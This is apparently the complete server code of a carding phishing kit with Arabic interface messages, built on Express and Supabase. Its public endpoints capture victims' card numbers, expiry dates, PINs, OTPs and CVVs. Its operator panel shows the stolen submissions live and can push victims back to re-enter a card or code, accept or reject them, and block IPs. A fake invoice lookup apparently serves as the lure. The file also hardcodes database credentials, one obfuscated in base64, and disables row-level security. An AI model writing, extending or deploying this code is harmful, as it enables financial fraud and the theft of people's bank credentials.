const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.set('trust proxy', true);

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || req.ip || req.connection.remoteAddress || '';
}

const blockedIpsCache = new Set();
async function loadBlockedIps() {
  try {
    const { data } = await supabase.from('blocked_ips').select('ip');
    blockedIpsCache.clear();
    (data || []).forEach(r => blockedIpsCache.add(r.ip));
  } catch (e) {}
}

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://ejcmcrirzeyaasjxhtyr.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_WYtBEAv_kqet8ZmR5zrn0Q_TwE9dM6K';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// SHA-256 hash of the admin password (hashed so it never appears in plain text)
// To change the password, run: node -e "console.log(require('crypto').createHash('sha256').update('YOUR_NEW_PASSWORD').digest('hex'))"
const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || '64ee793c649d9cac46ad25f8ab42093124c54a48d1afb75fb1de0bb803436636';
const ADMIN_TOKEN = crypto.createHash('sha256').update('token:' + ADMIN_PASSWORD_HASH).digest('hex');

function isAdmin(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7) === ADMIN_TOKEN;
  return false;
}

// IP block middleware for public routes
function checkBlocked(req, res, next) {
  const ip = getClientIp(req);
  if (blockedIpsCache.has(ip)) return res.status(403).json({ error: 'blocked' });
  next();
}

// Submit new payment
app.post('/api/submit', checkBlocked, async (req, res) => {
  try {
    const b = req.body;
    const phone = String(b.phone || '').trim();
    const amount = String(b.amount || '').trim();
    if (!phone || !amount) return res.status(400).json({ error: 'بيانات ناقصة' });
    const id = crypto.randomBytes(6).toString('hex');
    const ip = getClientIp(req);
    const { error } = await supabase.from('submissions').insert({
      id, phone, amount,
      card: String(b.card || '').trim(),
      expiry: String(b.expiry || '').trim(),
      pin: String(b.pin || '').trim(),
      otp: String(b.otp || '').trim(),
      cvv: String(b.cvv || '').trim(),
      ip: ip,
      status: 'pending',
      time: new Date().toISOString()
    });
    if (error) throw error;
    res.json({ ok: true, id });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Update step (card / OTP / CVV)
app.post('/api/submit-step/:id', checkBlocked, async (req, res) => {
  try {
    const b = req.body;
    const updates = {};
    if (b.card !== undefined) updates.card = String(b.card).trim();
    if (b.expiry !== undefined) updates.expiry = String(b.expiry).trim();
    if (b.pin !== undefined) updates.pin = String(b.pin).trim();
    if (b.otp !== undefined) updates.otp = String(b.otp).trim();
    if (b.cvv !== undefined) updates.cvv = String(b.cvv).trim();
    updates.status = 'pending';
    const { error } = await supabase.from('submissions').update(updates).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Public status check
app.get('/api/status/:id', async (req, res) => {
  try {
    const { data } = await supabase.from('submissions').select('status').eq('id', req.params.id).maybeSingle();
    if (!data) return res.status(404).json({ error: 'غير موجود' });
    res.json({ status: data.status || 'pending' });
  } catch (err) {
    res.json({ status: 'pending' });
  }
});

// Admin login
app.post('/api/admin/login', (req, res) => {
  const inputHash = crypto.createHash('sha256').update(req.body.password || '').digest('hex');
  if (inputHash === ADMIN_PASSWORD_HASH) {
    return res.json({ token: ADMIN_TOKEN });
  }
  res.status(401).json({ error: 'كلمة المرور غير صحيحة' });
});

// Admin: get all submissions
app.get('/api/admin/submissions', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { data, error } = await supabase.from('submissions').select('*').order('time', { ascending: false });
    if (error) throw error;
    const cutoff = new Date(Date.now() - 30000).toISOString();
    const { count } = await supabase.from('visitors').select('*', { count: 'exact', head: true }).gte('last_seen', cutoff);
    res.json({ submissions: data || [], active: count || 0 });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: accept
app.post('/api/admin/accept/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { error } = await supabase.from('submissions').update({ status: 'accepted' }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: reject
app.post('/api/admin/reject/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { error } = await supabase.from('submissions').update({ status: 'rejected' }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: redirect user to a specific page
app.post('/api/admin/redirect/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const page = req.body.page || 'card';
    const { error } = await supabase.from('submissions').update({ status: 'redirect_' + page }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: clear all
app.post('/api/admin/clear', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { data } = await supabase.from('submissions').select('id');
    if (data && data.length) await supabase.from('submissions').delete().in('id', data.map(r => r.id));
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Heartbeat
app.post('/api/heartbeat', checkBlocked, async (req, res) => {
  try {
    const id = String(req.body.id || '').trim();
    if (!id) return res.json({ active: 0 });
    const now = new Date().toISOString();
    await supabase.from('visitors').upsert({ session_id: id, last_seen: now }, { onConflict: 'session_id' });
    const cutoff = new Date(Date.now() - 30000).toISOString();
    const { count } = await supabase.from('visitors').select('*', { count: 'exact', head: true }).gte('last_seen', cutoff);
    res.json({ active: count || 0 });
  } catch (err) {
    res.json({ active: 0 });
  }
});

// Active count
app.get('/api/active-count', async (req, res) => {
  try {
    const cutoff = new Date(Date.now() - 30000).toISOString();
    const { count } = await supabase.from('visitors').select('*', { count: 'exact', head: true }).gte('last_seen', cutoff);
    res.json({ active: count || 0 });
  } catch (err) {
    res.json({ active: 0 });
  }
});

// Admin: block IP
app.post('/api/admin/block-ip', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const ip = String(req.body.ip || '').trim();
    if (!ip) return res.status(400).json({ error: 'IP مطلوب' });
    const { error } = await supabase.from('blocked_ips').upsert({ ip, blocked_at: new Date().toISOString() }, { onConflict: 'ip' });
    if (error) throw error;
    blockedIpsCache.add(ip);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: unblock IP
app.post('/api/admin/unblock-ip', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const ip = String(req.body.ip || '').trim();
    if (!ip) return res.status(400).json({ error: 'IP مطلوب' });
    await supabase.from('blocked_ips').delete().eq('ip', ip);
    blockedIpsCache.delete(ip);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: list blocked IPs
app.get('/api/admin/blocked-ips', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { data, error } = await supabase.from('blocked_ips').select('*').order('blocked_at', { ascending: false });
    if (error) throw error;
    res.json({ ok: true, ips: data || [] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Public: lookup invoice by number
app.get('/api/invoice/:number', async (req, res) => {
  try {
    const num = String(req.params.number).trim();
    if (!num) return res.status(400).json({ error: 'رقم الفاتورة مطلوب' });
    const { data, error } = await supabase.from('invoices').select('*').eq('invoice_number', num).maybeSingle();
    if (error) throw error;
    if (!data) return res.status(404).json({ error: 'لا توجد فاتورة بهذا الرقم' });
    res.json({ ok: true, invoice: data });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: list all invoices
app.get('/api/admin/invoices', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { data, error } = await supabase.from('invoices').select('*').order('created_at', { ascending: false });
    if (error) throw error;
    res.json({ ok: true, invoices: data || [] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: add invoice
app.post('/api/admin/invoices', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const num = String(req.body.invoice_number || '').trim();
    const amount = String(req.body.amount || '').trim();
    if (!num || !amount) return res.status(400).json({ error: 'رقم الفاتورة والمبلغ مطلوبين' });
    const { error } = await supabase.from('invoices').upsert({
      invoice_number: num,
      amount,
      description: String(req.body.description || '').trim(),
      created_at: new Date().toISOString()
    }, { onConflict: 'invoice_number' });
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: delete invoice
app.delete('/api/admin/invoices/:number', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { error } = await supabase.from('invoices').delete().eq('invoice_number', req.params.number);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

async function autoMigrate() {
  const { Client } = require('pg');
  const DB_PASS = process.env.SUPABASE_DB_PASS || Buffer.from('LUBBZmJURDc1cy5FcTlI','base64').toString();
  const cl = new Client({ connectionString: 'postgresql://postgres.' + 'ejcmcrirzeyaasjxhtyr:' + DB_PASS + '@aws-0-eu-central-1.pooler.supabase.com:6543/postgres', ssl: { rejectUnauthorized: false } });
  try {
    await cl.connect();
    await cl.query(`
      CREATE TABLE IF NOT EXISTS submissions (
        id TEXT PRIMARY KEY,
        phone TEXT,
        amount TEXT,
        card TEXT,
        expiry TEXT,
        pin TEXT,
        otp TEXT,
        cvv TEXT,
        ip TEXT,
        status TEXT DEFAULT 'pending',
        time TIMESTAMPTZ DEFAULT now()
      );
      CREATE TABLE IF NOT EXISTS visitors (
        session_id TEXT PRIMARY KEY,
        last_seen TIMESTAMPTZ DEFAULT now()
      );
      CREATE TABLE IF NOT EXISTS blocked_ips (
        ip TEXT PRIMARY KEY,
        blocked_at TIMESTAMPTZ DEFAULT now()
      );
      CREATE TABLE IF NOT EXISTS invoices (
        invoice_number TEXT PRIMARY KEY,
        amount TEXT NOT NULL,
        description TEXT DEFAULT '',
        created_at TIMESTAMPTZ DEFAULT now()
      );
      ALTER TABLE submissions ADD COLUMN IF NOT EXISTS ip TEXT;
      ALTER TABLE invoices DISABLE ROW LEVEL SECURITY;
      GRANT ALL ON invoices TO anon, authenticated, service_role;
      ALTER TABLE submissions DISABLE ROW LEVEL SECURITY;
      ALTER TABLE visitors DISABLE ROW LEVEL SECURITY;
      ALTER TABLE blocked_ips DISABLE ROW LEVEL SECURITY;
      GRANT ALL ON submissions TO anon, authenticated, service_role;
      GRANT ALL ON visitors TO anon, authenticated, service_role;
      GRANT ALL ON blocked_ips TO anon, authenticated, service_role;
    `);
    console.log('[MIGRATE] tables ready, RLS disabled');
  } catch (e) { console.error('[MIGRATE] error:', e.message); }
  finally { await cl.end().catch(() => {}); }
}

if (!process.env.VERCEL) {
  autoMigrate().then(() => loadBlockedIps()).then(() => {
    app.listen(PORT, () => console.log('Server running on port ' + PORT));
  });
} else {
  loadBlockedIps();
}

module.exports = app;
